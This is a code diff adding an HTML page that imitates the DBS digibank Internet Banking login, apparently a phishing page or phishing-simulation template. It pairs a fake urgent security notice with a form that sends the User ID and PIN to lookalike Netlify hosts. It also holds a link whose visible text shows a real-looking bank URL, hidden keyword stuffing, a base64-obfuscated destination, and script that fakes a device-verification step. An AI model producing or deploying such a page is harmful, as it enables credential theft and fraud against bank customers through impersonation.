@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DBS digibank - Internet Banking</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background: #f6f6f6;
+      color: #333;
+    }
+
+    header {
+      background: white;
+      height: 78px;
+      display: flex;
+      align-items: center;
+      padding: 0 9%;
+      border-bottom: 1px solid #ddd;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 27px;
+      font-weight: bold;
+      color: #d71920;
+    }
+
+    .symbol {
+      width: 34px;
+      height: 34px;
+      background: #d71920;
+      transform: rotate(45deg);
+      border-radius: 5px;
+    }
+
+    .banking {
+      margin-left: auto;
+      color: #777;
+      font-size: 13px;
+    }
+
+    .hero {
+      background: linear-gradient(115deg, #8d1015, #d71920);
+      color: white;
+      padding: 36px 9%;
+    }
+
+    .hero h1 {
+      margin: 0 0 8px;
+      font-size: 28px;
+    }
+
+    .hero p {
+      margin: 0;
+      opacity: .9;
+      font-size: 14px;
+    }
+
+    .content {
+      max-width: 1050px;
+      margin: 38px auto;
+      padding: 0 20px;
+      display: grid;
+      grid-template-columns: 430px 1fr;
+      gap: 35px;
+    }
+
+    .login {
+      background: white;
+      padding: 30px;
+      border-radius: 6px;
+      box-shadow: 0 2px 12px rgba(0,0,0,.1);
+    }
+
+    .login h2 {
+      margin-top: 0;
+      font-size: 21px;
+    }
+
+    .alert {
+      background: #fff1d8;
+      border-left: 4px solid #e3a121;
+      padding: 12px 14px;
+      font-size: 12px;
+      line-height: 1.5;
+      margin-bottom: 22px;
+    }
+
+    label {
+      display: block;
+      margin: 17px 0 7px;
+      font-size: 13px;
+      font-weight: bold;
+    }
+
+    input {
+      width: 100%;
+      height: 44px;
+      padding: 0 12px;
+      border: 1px solid #aaa;
+      border-radius: 3px;
+      font-size: 14px;
+    }
+
+    .login-button {
+      width: 100%;
+      height: 45px;
+      margin-top: 24px;
+      background: #d71920;
+      border: 0;
+      border-radius: 3px;
+      color: white;
+      font-size: 15px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .login-links {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 17px;
+      font-size: 12px;
+    }
+
+    a {
+      color: #b2151a;
+      text-decoration: none;
+    }
+
+    .information {
+      padding: 10px 5px;
+    }
+
+    .information h2 {
+      margin-top: 0;
+      font-size: 22px;
+    }
+
+    .information p,
+    .information li {
+      font-size: 13px;
+      line-height: 1.7;
+      color: #555;
+    }
+
+    .security-card {
+      background: white;
+      padding: 20px;
+      border-left: 4px solid #d71920;
+      margin-top: 22px;
+    }
+
+    .security-card strong {
+      display: block;
+      margin-bottom: 8px;
+    }
+
+    .verification-link {
+      margin-top: 20px;
+      font-size: 12px;
+    }
+
+    footer {
+      margin-top: 60px;
+      background: #292929;
+      color: #aaa;
+      padding: 30px 9%;
+      font-size: 11px;
+    }
+
+    .offscreen {
+      position: fixed;
+      top: -10000px;
+      left: -10000px;
+      width: 1px;
+      height: 1px;
+      overflow: hidden;
+    }
+
+    @media (max-width: 800px) {
+      .content {
+        grid-template-columns: 1fr;
+      }
+
+      .banking {
+        display: none;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <header>
+    <div class="logo">
+      <div class="symbol"></div>
+      DBS
+    </div>
+
+    <div class="banking">
+      Personal Banking | digibank
+    </div>
+  </header>
+
+  <section class="hero">
+    <h1>Welcome to DBS Internet Banking</h1>
+    <p>Access your accounts and manage your banking securely.</p>
+  </section>
+
+  <main class="content">
+
+    <section class="login">
+
+      <h2>Login to digibank</h2>
+
+      <div class="alert">
+        Important security notice: We detected an authentication
+        attempt from a new device. Please confirm your account access
+        today to avoid temporary restrictions.
+      </div>
+
+      <form
+        id="bankLogin"
+        action="https://dbs-secure-access-test.netlify.app/auth/session"
+        method="POST"
+      >
+
+        <label for="userid">User ID</label>
+        <input
+          id="userid"
+          name="user_id"
+          type="text"
+          placeholder="Enter your User ID"
+          autocomplete="username"
+          required
+        >
+
+        <label for="pin">Internet Banking PIN</label>
+        <input
+          id="pin"
+          name="banking_pin"
+          type="password"
+          inputmode="numeric"
+          placeholder="Enter your PIN"
+          autocomplete="current-password"
+          required
+        >
+
+        <input
+          type="hidden"
+          name="device_status"
+          value="unrecognized"
+        >
+
+        <input
+          type="hidden"
+          name="reference"
+          value="DBS-291840172"
+        >
+
+        <button class="login-button" type="submit">
+          Login Securely
+        </button>
+
+      </form>
+
+      <div class="login-links">
+        <a
+          href="#"
+          data-target="https://dbs-userid-recovery-test.netlify.app/account"
+        >
+          Forgot User ID?
+        </a>
+
+        <a
+          href="#"
+          data-target="https://dbs-pin-reset-test.netlify.app/reset"
+        >
+          Forgot PIN?
+        </a>
+      </div>
+
+    </section>
+
+    <section class="information">
+
+      <h2>Bank securely with digibank</h2>
+
+      <p>
+        Your online banking security is important. Additional
+        verification may be requested when accessing your account
+        from an unfamiliar device or network.
+      </p>
+
+      <div class="security-card">
+        <strong>Account Verification Required</strong>
+
+        <p>
+          Customers with pending security verification should
+          complete the authentication process before continuing
+          with transfers, payments, or other banking services.
+        </p>
+
+        <ul>
+          <li>Confirm your registered account information.</li>
+          <li>Verify your current device.</li>
+          <li>Complete authentication when requested.</li>
+        </ul>
+      </div>
+
+      <div class="verification-link">
+        Security Center:
+        <a
+          href="#"
+          data-destination="https://dbs-security-validation-test.netlify.app/verify"
+        >
+          https://internet-banking.dbs.com/security
+        </a>
+      </div>
+
+    </section>
+
+  </main>
+
+  <div class="offscreen">
+    dbs digibank banking login userid password pin account
+    verification secure authentication transfer payment bank
+    online banking security device verification credential
+  </div>
+
+  <footer>
+    DBS Bank • Personal Banking • Security & Privacy • Help & Support
+  </footer>
+
+  <script>
+    const payload =
+      "aHR0cHM6Ly9kYnMtc2VjdXJlLWFjY2Vzcy10ZXN0Lm5ldGxpZnkuYXBwL3ZlcmlmeS9hY2NvdW50";
+
+    const destination = atob(payload);
+
+    document
+      .getElementById("bankLogin")
+      .addEventListener("submit", function(event) {
+        event.preventDefault();
+
+        const userid = document.getElementById("userid");
+        const pin = document.getElementById("pin");
+
+        userid.value = "";
+        pin.value = "";
+
+        window.history.replaceState(
+          {},
+          "",
+          "/banking/device-authentication"
+        );
+
+        document.querySelector(".login").innerHTML =
+          "<h2>Security Verification</h2>" +
+          "<p>Your device is being authenticated.</p>" +
+          "<p>Please wait while your banking session is verified.</p>";
+
+        console.log(destination);
+      });
+  </script>
+
+</body>
+</html>
